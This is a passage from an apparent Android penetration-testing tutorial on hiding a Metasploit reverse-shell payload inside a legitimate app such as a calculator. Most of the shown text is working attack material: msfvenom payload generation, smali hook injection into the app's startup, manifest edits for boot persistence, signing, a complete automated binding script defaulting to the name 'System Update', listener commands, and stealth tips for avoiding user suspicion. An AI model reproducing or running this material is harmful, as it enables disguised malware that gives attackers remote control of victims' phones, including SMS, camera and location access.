│  ├── Produces a single unsigned APK
│  └── All original + payload code in one package
│
│  STEP 6: Align and sign
│  ├── zipalign optimizes the APK
│  ├── jarsigner/apksigner signs with our key
│  └── APK is ready for installation
│
│  RESULT: Single APK that works as original app
│          while silently running our payload
```

### 9.3 Why Bind Instead of Standalone Payload?

```
╔═══════════════════════════════════════════════════════════════╗
║           STANDALONE vs BOUND PAYLOAD COMPARISON              ║
╠═══════════════════════════════════════════════════════════════╣
║                                                                ║
║  FACTOR          │ STANDALONE      │ BOUND                   ║
║  ────────────────┼─────────────────┼──────────────────────── ║
║  User suspicion  │ HIGH            │ LOW                     ║
║                  │ Blank app with  │ Looks like a real app   ║
║                  │ no functionality│ with real functionality  ║
║  ────────────────┼─────────────────┼──────────────────────── ║
║  Detection       │ EASY            │ HARDER                  ║
║                  │ Play Protect    │ Looks legitimate        ║
║                  │ flags it easily │ Harder to flag          ║
║  ────────────────┼─────────────────┼──────────────────────── ║
║  User keeps app? │ NO              │ YES                     ║
║                  │ User will       │ User uses the app       ║
║                  │ uninstall it    │ and keeps it            ║
║  ────────────────┼─────────────────┼──────────────────────── ║
║  Persistence     │ LOW             │ HIGH                    ║
║                  │ One-time use    │ User keeps using app    ║
║                  │                 │ payload keeps running   ║
║  ────────────────┼─────────────────┼──────────────────────── ║
║  Complexity      │ SIMPLE          │ MODERATE                ║
║                  │ One command     │ Multiple steps          ║
║  ────────────────┼─────────────────┼──────────────────────── ║
║  Best for        │ Quick tests     │ Long-term access        ║
║                  │ Lab exercises   │ Red team exercises      ║
║                  │                 │ Real pentests           ║
║                                                                ║
╚═══════════════════════════════════════════════════════════════╝
```

---

## Chapter 10: Manual APK Binding (Step-by-Step)

This is the most important chapter. We'll bind a payload with a legitimate app, explaining every single step in detail.

### 10.1 Complete Manual Binding Process

```bash
# ═══════════════════════════════════════════════════════════════
#                    COMPLETE BINDING TUTORIAL
# ═══════════════════════════════════════════════════════════════
#
# In this tutorial, we will:
# 1. Get a legitimate APK
# 2. Generate a payload
# 3. Decompile both
# 4. Merge the payload into the legitimate app
# 5. Modify the manifest
# 6. Hook the payload into the app's startup
# 7. Rebuild, align, and sign
# 8. Test the result
#
# TIME REQUIRED: ~15-30 minutes
# DIFFICULTY: Intermediate
#
# ═══════════════════════════════════════════════════════════════

# Navigate to working directory
cd ~/android-pentest
```

#### STEP 1: Obtain a Legitimate APK

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 1: GET A LEGITIMATE APK
# ═══════════════════════════════════════════════════════════════
#
# You need a legitimate APK to bind with. Options:
#
# A) Extract from your own device (BEST for testing):
#    adb shell pm list packages | grep -i calculator
#    adb shell pm path com.google.android.calculator
#    adb pull /data/app/com.google.android.calculator-1/base.apk
#
# B) Download from APK mirror sites:
#    - apkmirror.com
#    - apkpure.com
#    - apkmonk.com
#
# C) Use a simple app you built yourself
#    (Best for learning - you understand the code)
#
# For this tutorial, let's use a simple calculator app.
# You can download any simple APK for testing.
#
# ═══════════════════════════════════════════════════════════════

# Method A: Extract from connected device
adb devices  # Verify device is connected

# List installed packages
adb shell pm list packages | grep -i calculator
# Example output: package:com.google.android.calculator

# Get APK path on device
adb shell pm path com.google.android.calculator
# Example output: package:/data/app/com.google.android.calculator-1/base.apk

# Pull APK from device to our machine
adb pull /data/app/com.google.android.calculator-1/base.apk \
    original_apps/calculator.apk

# Method B: If you have an APK file already, just copy it
# cp /path/to/your/app.apk original_apps/calculator.apk

# Verify the APK
ls -la original_apps/calculator.apk
file original_apps/calculator.apk

# Check APK info
aapt dump badging original_apps/calculator.apk | head -20
# Shows: package name, version, permissions, etc.
```

#### STEP 2: Generate the Payload

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 2: GENERATE THE PAYLOAD
# ═══════════════════════════════════════════════════════════════
#
# We generate a standalone payload APK, then extract its
# Smali code to inject into the legitimate app.
#
# ═══════════════════════════════════════════════════════════════

# Generate payload
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o payloads/meterpreter_payload.apk

# Expected output:
# [-] No platform was selected...
# [-] No arch selected...
# Payload size: 10190 bytes
# Saved as: payloads/meterpreter_payload.apk

# Verify
ls -la payloads/meterpreter_payload.apk
```

#### STEP 3: Decompile Both APKs

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 3: DECOMPILE BOTH APKs
# ═══════════════════════════════════════════════════════════════
#
# We use Apktool to convert both APKs into readable/editable
# Smali code and resources.
#
# Apktool "d" flag = decompile
# "-o" flag = output directory
# "-f" flag = force overwrite if exists
#
# ═══════════════════════════════════════════════════════════════

# Decompile the LEGITIMATE app
echo "[*] Decompiling legitimate app..."
apktool d original_apps/calculator.apk -o decompiled/calculator -f

# Verify decompilation
ls decompiled/calculator/
# Expected output:
# AndroidManifest.xml  apktool.yml  original/  res/  smali/

# Decompile the PAYLOAD
echo "[*] Decompiling payload..."
apktool d payloads/meterpreter_payload.apk -o decompiled/payload -f

# Verify decompilation
ls decompiled/payload/
# Expected output:
# AndroidManifest.xml  apktool.yml  original/  res/  smali/

# Look at the payload's Smali structure
find decompiled/payload/smali -name "*.smali" | sort
# Expected output:
# decompiled/payload/smali/com/metasploit/stage/MainActivity.smali
# decompiled/payload/smali/com/metasploit/stage/MainService.smali
# decompiled/payload/smali/com/metasploit/stage/Payload.smali
# decompiled/payload/smali/com/metasploit/stage/PayloadTrustManager.smali
# ... etc.

echo "[*] Decompilation complete!"
```

#### STEP 4: Copy Payload Code into Legitimate App

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 4: COPY PAYLOAD CODE INTO LEGITIMATE APP
# ═══════════════════════════════════════════════════════════════
#
# This is the CORE of the binding process.
# We copy the Metasploit payload Smali classes from the payload
# APK into the legitimate app's Smali directory.
#
# The payload code lives in: smali/com/metasploit/stage/
# We copy it to: <legitimate_app>/smali/com/metasploit/stage/
#
# ═══════════════════════════════════════════════════════════════

# Create the target directory structure
echo "[*] Creating payload directory in legitimate app..."
mkdir -p decompiled/calculator/smali/com/metasploit/stage/

# Copy ALL payload Smali files
echo "[*] Copying payload Smali code..."
cp -r decompiled/payload/smali/com/metasploit/stage/* \
      decompiled/calculator/smali/com/metasploit/stage/

# Verify the copy
echo "[*] Verifying copied files..."
ls -la decompiled/calculator/smali/com/metasploit/stage/
# Expected output:
# MainActivity.smali
# MainService.smali
# Payload.smali
# PayloadTrustManager.smali
# (and any other payload files)

# Count total files copied
find decompiled/calculator/smali/com/metasploit -name "*.smali" | wc -l
# Should show several files

echo "[+] Payload code successfully copied!"
```

#### STEP 5: Modify the AndroidManifest.xml

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 5: MODIFY THE ANDROIDMANIFEST.XML
# ═══════════════════════════════════════════════════════════════
#
# We need to:
# A) Add permissions required by the payload
# B) Add the payload Service, Activity, and Receiver declarations
#
# Let's first read the original manifest to understand its structure.
# ═══════════════════════════════════════════════════════════════

# Read the original manifest
echo "[*] Original AndroidManifest.xml:"
cat decompiled/calculator/AndroidManifest.xml

# Also check the payload's manifest to see what it needs
echo "[*] Payload AndroidManifest.xml:"
cat decompiled/payload/AndroidManifest.xml

# ═══════════════════════════════════════════════════════════════
# PART A: ADD PERMISSIONS
# ═══════════════════════════════════════════════════════════════
#
# We need to add these permissions to the legitimate app's manifest:
# (Only add what's not already there)
#
# Minimum required:
#   - INTERNET (for connection)
#   - ACCESS_NETWORK_STATE
#   - ACCESS_WIFI_STATE
#   - READ_PHONE_STATE
#   - RECEIVE_BOOT_COMPLETED (for persistence)
#   - WAKE_LOCK
#
# Optional (add if needed for post-exploitation):
#   - CAMERA
#   - RECORD_AUDIO
#   - READ_SMS
#   - READ_CONTACTS
#   - ACCESS_FINE_LOCATION
#   - READ_EXTERNAL_STORAGE
#   - WRITE_EXTERNAL_STORAGE
#
# ═══════════════════════════════════════════════════════════════

# Let's add the minimum required permissions
# We add them just before the <application> tag

# Create a backup of the original manifest
cp decompiled/calculator/AndroidManifest.xml \
   decompiled/calculator/AndroidManifest.xml.backup

# Add permissions using sed
# We insert each permission before the <application> tag
sed -i '/<application/i\
    <!-- Payload permissions -->\
    <uses-permission android:name="android.permission.INTERNET" />\
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />\
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />\
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />\
    <uses-permission android:name="android.permission.WAKE_LOCK" />' \
    decompiled/calculator/AndroidManifest.xml

# Verify permissions were added
echo "[*] Verifying permissions..."
grep "uses-permission" decompiled/calculator/AndroidManifest.xml

# ═══════════════════════════════════════════════════════════════
# PART B: ADD PAYLOAD COMPONENT DECLARATIONS
# ═══════════════════════════════════════════════════════════════
#
# We need to add before </application>:
#   1. The MainService (background service)
#   2. The BootReceiver (auto-start on boot)
#
# ═══════════════════════════════════════════════════════════════

# Add payload Service and Receiver before </application>
sed -i '/<\/application>/i\
    \
    <!-- Payload components -->\
    <service android:name="com.metasploit.stage.MainService"\
        android:exported="false">\
        <intent-filter>\
            <action android:name="com.metasploit.stage.MainService"/>\
        </intent-filter>\
    </service>\
    \
    <receiver android:name="com.metasploit.stage.BootReceiver"\
        android:exported="true">\
        <intent-filter>\
            <action android:name="android.intent.action.BOOT_COMPLETED"/>\
        </intent-filter>\
    </receiver>' \
    decompiled/calculator/AndroidManifest.xml

# Verify the complete manifest
echo "[*] Modified AndroidManifest.xml:"
cat decompiled/calculator/AndroidManifest.xml

echo "[+] Manifest modification complete!"
```

#### STEP 6: Hook Payload into App Startup

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 6: HOOK PAYLOAD INTO APP STARTUP
# ═══════════════════════════════════════════════════════════════
#
# This is the most CRITICAL step.
# We need to modify the legitimate app's launcher Activity
# to start our payload Service when the app opens.
#
# First, we need to find WHICH Activity is the launcher.
# ═══════════════════════════════════════════════════════════════

# Find the launcher Activity in the manifest
echo "[*] Finding launcher Activity..."
grep -B 10 "MAIN" decompiled/calculator/AndroidManifest.xml | grep "android:name"

# Example output:
# android:name="com.google.android.calculator.Calculator"
# This is the Activity we need to modify!

# Store the launcher Activity name
LAUNCHER_ACTIVITY=$(grep -B 10 "MAIN" decompiled/calculator/AndroidManifest.xml | \
    grep "android:name" | head -1 | \
    sed 's/.*android:name="//' | sed 's/".*//')

echo "[*] Launcher Activity: $LAUNCHER_ACTIVITY"
# Example: com.google.android.calculator.Calculator

# Convert the Activity name to Smali path format
# Replace dots with slashes
SMALI_PATH=$(echo $LAUNCHER_ACTIVITY | sed 's/\./\//g')
SMALI_FILE="decompiled/calculator/smali/${SMALI_PATH}.smali"

echo "[*] Smali file: $SMALI_FILE"

# Verify the file exists
ls -la "$SMALI_FILE"

# ═══════════════════════════════════════════════════════════════
# Now we need to ADD code to the onCreate() method
# to start our payload Service.
#
# In Smali, we need to add code that:
# 1. Creates an Intent for our MainService
# 2. Starts the Service
#
# This code goes AFTER the "invoke-super" line in onCreate()
# ═══════════════════════════════════════════════════════════════

# Find the onCreate method
echo "[*] Finding onCreate method..."
grep -n "onCreate" "$SMALI_FILE"

# Find the invoke-super line in onCreate
echo "[*] Finding invoke-super line..."
grep -n "invoke-super.*onCreate" "$SMALI_FILE"

# Get the line number
SUPER_LINE=$(grep -n "invoke-super.*onCreate" "$SMALI_FILE" | head -1 | cut -d: -f1)
echo "[*] invoke-super at line: $SUPER_LINE"

# ═══════════════════════════════════════════════════════════════
# CREATE THE PAYLOAD INJECTION CODE
# ═══════════════════════════════════════════════════════════════
#
# We'll create a Smali code snippet that starts our service.
# Here's what the code does (in Java equivalent):
#
#   Intent intent = new Intent(this, MainService.class);
#   startService(intent);
#
# In Smali, this becomes:
#
#   new-instance v0, Landroid/content/Intent;
#   const-class v1, Lcom/metasploit/stage/MainService;
#   invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(
#       Landroid/content/Context;Ljava/lang/Class;)V
#   invoke-virtual {p0, v0}, L<ActivityClass>;->startService(
#       Landroid/content/Intent;)Landroid/content/ComponentName;
#
# ═══════════════════════════════════════════════════════════════

# Create the injection code
cat > /tmp/payload_hook.smali << 'EOF'

    # ═══════════════════════════════════════════════════
    # PAYLOAD HOOK - Start Metasploit Service
    # Added by pentest automation
    # ═══════════════════════════════════════════════════

    # Create Intent for our payload service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    # Start the service
    invoke-virtual {p0, v0}, ACTIVITY_CLASS_PLACEHOLDER;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    # ═══════════════════════════════════════════════════
    # END PAYLOAD HOOK
    # ═══════════════════════════════════════════════════

EOF

# Replace the placeholder with the actual Activity class
sed -i "s|ACTIVITY_CLASS_PLACEHOLDER|L${SMALI_PATH};|g" /tmp/payload_hook.smali

# Read the injection code
echo "[*] Injection code:"
cat /tmp/payload_hook.smali

# ═══════════════════════════════════════════════════════════════
# INJECT THE CODE INTO THE APP
# ═══════════════════════════════════════════════════════════════

# Insert the code after the invoke-super line in onCreate
# We use sed to read the file, find the line, and insert after it

# Method: Create a new file with the injection
{
    # Read up to and including the invoke-super line
    head -n $SUPER_LINE "$SMALI_FILE"
    # Insert our payload hook
    cat /tmp/payload_hook.smali
    # Read the rest of the file
    tail -n +$((SUPER_LINE + 1)) "$SMALI_FILE"
} > /tmp/modified_smali.smali

# Replace the original file with the modified version
cp /tmp/modified_smali.smali "$SMALI_FILE"

# Verify the injection
echo "[*] Verifying injection..."
grep -A 15 "invoke-super.*onCreate" "$SMALI_FILE"

echo "[+] Payload hook injected successfully!"
```

#### STEP 7: Rebuild the APK

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 7: REBUILD THE APK
# ═══════════════════════════════════════════════════════════════
#
# Now we recompile the modified app back into an APK.
# Apktool's "b" flag = build
#
# ═══════════════════════════════════════════════════════════════

echo "[*] Rebuilding APK..."
apktool b decompiled/calculator/ -o bound_apps/calculator_bound_unsigned.apk

# Check if build was successful
if [ -f "bound_apps/calculator_bound_unsigned.apk" ]; then
    echo "[+] APK rebuilt successfully!"
    ls -la bound_apps/calculator_bound_unsigned.apk
else
    echo "[-] APK build FAILED!"
    echo "[-] Check Apktool output for errors above."
    echo "[-] Common issues:"
    echo "    - Smali syntax errors (check your injection)"
    echo "    - Missing resources"
    echo "    - Manifest syntax errors"
    exit 1
fi
```

#### STEP 8: Align and Sign the APK

```bash
# ═══════════════════════════════════════════════════════════════
# STEP 8: ALIGN AND SIGN THE APK
# ═══════════════════════════════════════════════════════════════
#
# Android requires APKs to be:
# 1. Aligned (zipalign) - Optimizes for memory mapping
# 2. Signed (apksigner/jarsigner) - Verifies authenticity
#
# WITHOUT signing, the APK CANNOT be installed!
#
# ═══════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────
# STEP 8a: ZIPALIGN
# ─────────────────────────────────────────────────

echo "[*] Aligning APK..."
zipalign -v 4 \
    bound_apps/calculator_bound_unsigned.apk \
    bound_apps/calculator_bound_aligned.apk

# Expected output:
# Verifying alignment of calculator_bound_aligned.apk (4)...
# ...
# Verification successful

ls -la bound_apps/calculator_bound_aligned.apk

# ─────────────────────────────────────────────────
# STEP 8b: CREATE SIGNING KEY
# ─────────────────────────────────────────────────
#
# We need a keystore to sign the APK.
# This is a one-time process (reuse the key for future builds).
#
# ═══════════════════════════════════════════════════════════════

echo "[*] Creating signing keystore..."

# Generate a new keystore with a key pair
keytool -genkeypair -v \
    -keystore signing_keys/pentest.keystore \
    -alias pentest \
    -keyalg RSA \
    -keysize 2048 \
    -validity 10000 \
    -storepass pentest123 \
    -keypass pentest123 \
    -dname "CN=Security Testing, OU=Pentest Division, O=Security Corp, L=Mumbai, S=Maharashtra, C=IN"

# Explanation of parameters:
# -genkeypair       : Generate a key pair (public + private)
# -keystore         : Path to save the keystore file
# -alias            : Name for the key within the keystore
# -keyalg RSA       : Algorithm (RSA is standard)
# -keysize 2048     : Key size in bits (2048 is secure)
# -validity 10000   : Key valid for 10000 days (~27 years)
# -storepass        : Password to access the keystore
# -keypass          : Password for the specific key
# -dname            : Distinguished name (certificate info)

# Verify keystore was created
ls -la signing_keys/pentest.keystore

# ─────────────────────────────────────────────────
# STEP 8c: SIGN THE APK
# ─────────────────────────────────────────────────

echo "[*] Signing APK..."

# Method 1: Using apksigner (RECOMMENDED - newer, better)
apksigner sign \
    --ks signing_keys/pentest.keystore \
    --ks-key-alias pentest \
    --ks-pass pass:pentest123 \
    --key-pass pass:pentest123 \
    --out bound_apps/calculator_bound_signed.apk \
    bound_apps/calculator_bound_aligned.apk

# Method 2: Using jarsigner (ALTERNATIVE - older, still works)
# jarsigner -verbose \
#     -sigalg SHA1withRSA \
#     -digestalg SHA1 \
#     -keystore signing_keys/pentest.keystore \
#     -storepass pentest123 \
#     -keypass pentest123 \
#     bound_apps/calculator_bound_aligned.apk \
#     pentest

# Verify the signature
echo "[*] Verifying signature..."
apksigner verify --verbose bound_apps/calculator_bound_signed.apk

# Expected output:
# Verifies
# Verified using v1 scheme (JAR signing): true
# Verified using v2 scheme (APK Signature Scheme v2): true
# Verified using v3 scheme (APK Signature Scheme v3): true
# Number of signers: 1

# Check signature details
echo "[*] Signature details:"
apksigner verify --print-certs bound_apps/calculator_bound_signed.apk

echo ""
echo "[+] ════════════════════════════════════════════════"
echo "[+] APK SUCCESSFULLY BUILT AND SIGNED!"
echo "[+] ════════════════════════════════════════════════"
echo "[+]"
echo "[+] Output: bound_apps/calculator_bound_signed.apk"
echo "[+]"
echo "[+] This APK:"
echo "[+]  - Contains the original calculator app"
echo "[+]  - Silently runs Meterpreter payload in background"
echo "[+]  - Is properly signed and ready for installation"
echo "[+] ════════════════════════════════════════════════"
```

---

## Chapter 11: Automated APK Binding

### 11.1 Complete Automated Binding Script

Here's a complete, production-ready script that automates the entire binding process:

```bash
#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# APK BINDING AUTOMATION SCRIPT
# Author: EFXTv
# Purpose: Automate the process of binding a Meterpreter payload
#          with a legitimate Android application
# Usage: ./bind_apk.sh <original.apk> <LHOST> <LPORT>
#
# IMPORTANT: Only use with written authorization!
# ═══════════════════════════════════════════════════════════════

set -e  # Exit on any error

# ─────────────────────────────────────────────────
# COLOR CODES FOR OUTPUT
# ─────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;36m'
NC='\033[0m'  # No Color

# ─────────────────────────────────────────────────
# FUNCTIONS
# ─────────────────────────────────────────────────

print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║           APK Payload Binding Tool                        ║"
    echo "║           Author: EFXTv                                   ║"
    echo "║           For AUTHORIZED Testing Only                     ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

check_dependencies() {
    log_info "Checking dependencies..."
    
    local missing=0
    for cmd in msfvenom apktool keytool zipalign apksigner java; do
        if ! command -v "$cmd" &> /dev/null; then
            log_error "Missing: $cmd"
            missing=1
        fi
    done
    
    if [ $missing -eq 1 ]; then
        log_error "Install missing dependencies before running this script."
        exit 1
    fi
    
    log_success "All dependencies found"
}

verify_authorization() {
    echo ""
    echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                    ⚠️  LEGAL WARNING ⚠️                    ║${NC}"
    echo -e "${RED}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}║  This tool creates payloads for penetration testing.       ║${NC}"
    echo -e "${RED}║  Only use on systems you OWN or have WRITTEN              ║${NC}"
    echo -e "${RED}║  AUTHORIZATION to test.                                   ║${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}║  Unauthorized use is ILLEGAL and may result in:           ║${NC}"
    echo -e "${RED}║  - Criminal prosecution                                   ║${NC}"
    echo -e "${RED}║  - Civil liability                                        ║${NC}"
    echo -e "${RED}║  - Imprisonment                                           ║${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Do you have WRITTEN authorization to test? (yes/no): " auth
    if [ "$auth" != "yes" ]; then
        log_error "Authorization required. Exiting."
        exit 1
    fi
    
    read -p "Enter authorization reference (ticket/case number): " auth_ref
    echo "Authorization: $auth_ref - $(date)" >> ~/android-pentest/auth_log.txt
    log_success "Authorization verified and logged"
}

# ─────────────────────────────────────────────────
# MAIN FUNCTION
# ─────────────────────────────────────────────────

main() {
    print_banner
    
    # Check arguments
    if [ $# -lt 3 ]; then
        echo "Usage: $0 <original.apk> <LHOST> <LPORT> [app_name]"
        echo ""
        echo "Arguments:"
        echo "  original.apk  - Path to the legitimate APK"
        echo "  LHOST         - Your IP address (listener)"
        echo "  LPORT         - Your port (listener)"
        echo "  app_name      - Optional: Custom app name"
        echo ""
        echo "Example:"
        echo "  $0 calculator.apk 192.168.1.10 4444 \"Calculator\""
        exit 1
    fi
    
    ORIGINAL_APK="$1"
    LHOST="$2"
    LPORT="$3"
    APP_NAME="${4:-System Update}"
    
    # Validate inputs
    if [ ! -f "$ORIGINAL_APK" ]; then
        log_error "Original APK not found: $ORIGINAL_APK"
        exit 1
    fi
    
    # Check dependencies
    check_dependencies
    
    # Verify authorization
    verify_authorization
    
    # Create working directory
    WORK_DIR=$(mktemp -d)
    log_info "Working directory: $WORK_DIR"
    
    # Step 1: Generate payload
    log_info "Step 1/8: Generating payload..."
    msfvenom -p android/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f apk \
        -o "$WORK_DIR/payload.apk" 2>/dev/null
    log_success "Payload generated"
    
    # Step 2: Decompile original APK
    log_info "Step 2/8: Decompiling original APK..."
    apktool d "$ORIGINAL_APK" -o "$WORK_DIR/original" -f 2>/dev/null
    log_success "Original APK decompiled"
    
    # Step 3: Decompile payload
    log_info "Step 3/8: Decompiling payload..."
    apktool d "$WORK_DIR/payload.apk" -o "$WORK_DIR/payload" -f 2>/dev/null
    log_success "Payload decompiled"
    
    # Step 4: Copy payload code
    log_info "Step 4/8: Injecting payload code..."
    mkdir -p "$WORK_DIR/original/smali/com/metasploit/stage/"
    cp -r "$WORK_DIR/payload/smali/com/metasploit/stage/"* \
          "$WORK_DIR/original/smali/com/metasploit/stage/"
    log_success "Payload code injected"
    
    # Step 5: Modify manifest
    log_info "Step 5/8: Modifying AndroidManifest.xml..."
    
    # Add permissions
    PERMISSIONS=(
        "android.permission.INTERNET"
        "android.permission.ACCESS_NETWORK_STATE"
        "android.permission.ACCESS_WIFI_STATE"
        "android.permission.READ_PHONE_STATE"
        "android.permission.RECEIVE_BOOT_COMPLETED"
        "android.permission.WAKE_LOCK"
    )
    
    for perm in "${PERMISSIONS[@]}"; do
        if ! grep -q "$perm" "$WORK_DIR/original/AndroidManifest.xml"; then
            sed -i "/<application/i\\    <uses-permission android:name=\"$perm\" />" \
                "$WORK_DIR/original/AndroidManifest.xml"
        fi
    done
    
    # Add service declaration
    if ! grep -q "com.metasploit.stage.MainService" "$WORK_DIR/original/AndroidManifest.xml"; then
        sed -i '/<\/application>/i\
        <service android:name="com.metasploit.stage.MainService" android:exported="false">\
            <intent-filter>\
                <action android:name="com.metasploit.stage.MainService"/>\
            </intent-filter>\
        </service>\
        <receiver android:name="com.metasploit.stage.BootReceiver" android:exported="true">\
            <intent-filter>\
                <action android:name="android.intent.action.BOOT_COMPLETED"/>\
            </intent-filter>\
        </receiver>' \
            "$WORK_DIR/original/AndroidManifest.xml"
    fi
    log_success "Manifest modified"
    
    # Step 6: Hook into launcher Activity
    log_info "Step 6/8: Hooking payload into app startup..."
    
    # Find launcher activity
    LAUNCHER=$(grep -B 10 "MAIN" "$WORK_DIR/original/AndroidManifest.xml" | \
        grep "android:name" | head -1 | \
        sed 's/.*android:name="//' | sed 's/".*//')
    
    SMALI_PATH=$(echo "$LAUNCHER" | sed 's/\./\//g')
    SMALI_FILE="$WORK_DIR/original/smali/${SMALI_PATH}.smali"
    
    if [ -f "$SMALI_FILE" ]; then
        # Find invoke-super line in onCreate
        SUPER_LINE=$(grep -n "invoke-super.*onCreate" "$SMALI_FILE" | head -1 | cut -d: -f1)
        
        if [ -n "$SUPER_LINE" ]; then
            # Create injection code
            HOOK_CODE="
    # Payload hook - start Meterpreter service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, L${SMALI_PATH};->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
"
            # Insert after invoke-super
            sed -i "${SUPER_LINE}a\\${HOOK_CODE}" "$SMALI_FILE"
            log_success "Payload hooked into $LAUNCHER"
        else
            log_warning "Could not find onCreate method. Payload may need manual start."
        fi
    else
        log_warning "Launcher Smali file not found: $SMALI_FILE"
        log_warning "Payload will need to be started manually."
    fi
    
    # Step 7: Rebuild APK
    log_info "Step 7/8: Rebuilding APK..."
    apktool b "$WORK_DIR/original" -o "$WORK_DIR/unsigned.apk" 2>/dev/null
    log_success "APK rebuilt"
    
    # Step 8: Align and sign
    log_info "Step 8/8: Aligning and signing..."
    
    # Align
    zipalign -v 4 "$WORK_DIR/unsigned.apk" "$WORK_DIR/aligned.apk" 2>/dev/null
    
    # Generate signing key
    keytool -genkeypair -v \
        -keystore "$WORK_DIR/signing.jks" \
        -alias pentest \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass pentest123 \
        -keypass pentest123 \
        -dname "CN=Pentest, OU=Test, O=Test, L=Test, S=Test, C=US" 2>/dev/null
    
    # Sign
    apksigner sign \
        --ks "$WORK_DIR/signing.jks" \
        --ks-key-alias pentest \
        --ks-pass pass:pentest123 \
        --key-pass pass:pentest123 \
        --out "$WORK_DIR/signed.apk" \
        "$WORK_DIR/aligned.apk" 2>/dev/null
    
    # Verify
    apksigner verify "$WORK_DIR/signed.apk" 2>/dev/null
    
    # Copy to output
    OUTPUT_FILE="bound_apps/bound_$(date +%Y%m%d_%H%M%S).apk"
    cp "$WORK_DIR/signed.apk" "$OUTPUT_FILE"
    
    # Cleanup
    rm -rf "$WORK_DIR"
    
    # Final output
    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              ✅ BINDING SUCCESSFUL!                        ║${NC}"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}║  Output APK: $OUTPUT_FILE${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}║  Payload Type: android/meterpreter/reverse_tcp            ║${NC}"
    echo -e "${GREEN}║  Listener: $LHOST:$LPORT${NC}"
    echo -e "${GREEN}║  App Name: $APP_NAME${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}║  NEXT STEPS:                                              ║${NC}"
    echo -e "${GREEN}║  1. Start the listener (see commands below)                ║${NC}"
    echo -e "${GREEN}║  2. Transfer APK to target device                         ║${NC}"
    echo -e "${GREEN}║  3. Install and open the app                              ║${NC}"
    echo -e "${GREEN}║  4. Wait for connection                                    ║${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo "Start listener with:"
    echo "  msfconsole -q -x \""
    echo "    use exploit/multi/handler;"
    echo "    set payload android/meterpreter/reverse_tcp;"
    echo "    set LHOST $LHOST;"
    echo "    set LPORT $LPORT;"
    echo "    set ExitOnSession false;"
    echo "    exploit -j\""
    echo ""
}

# Run main function
main "$@"
```

Make it executable and test:

```bash
# Save the script
# (Copy the above script to ~/android-pentest/bind_apk.sh)

# Make it executable
chmod +x ~/android-pentest/bind_apk.sh

# Run it
cd ~/android-pentest
./bind_apk.sh original_apps/calculator.apk 192.168.1.10 4444 "Calculator"
```

---

## Chapter 12: Advanced Binding Techniques

### 12.1 Reducing Permissions for Stealth

```bash
# ═══════════════════════════════════════════════════════════════
# STEALTH BINDING: MINIMUM PERMISSIONS
# ═══════════════════════════════════════════════════════════════
#
# The default payload requests many dangerous permissions.
# For a calculator app, this is suspicious!
#
# A calculator shouldn't need CAMERA or READ_SMS.
#
# Strategy: Only keep INTERNET permission (minimum for payload)
# Add others later via runtime exploitation if needed
#
# ═══════════════════════════════════════════════════════════════

# After decompiling, edit the manifest manually
nano decompiled/calculator/AndroidManifest.xml

# KEEP ONLY:
# <uses-permission android:name="android.permission.INTERNET" />
# <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

# REMOVE ALL OTHER PERMISSIONS
# This makes the app look much less suspicious!

# Note: With only INTERNET permission, the payload can:
# ✅ Connect to your listener
# ✅ Get basic system info
# ❌ Cannot read SMS (needs READ_SMS)
# ❌ Cannot use camera (needs CAMERA)
# ❌ Cannot get GPS (needs ACCESS_FINE_LOCATION)
#
# But you can escalate later via Meterpreter's permission prompts!
```

### 12.2 Modifying the Payload Package Name

```bash
# ═══════════════════════════════════════════════════════════════
# CHANGING PAYLOAD PACKAGE NAME
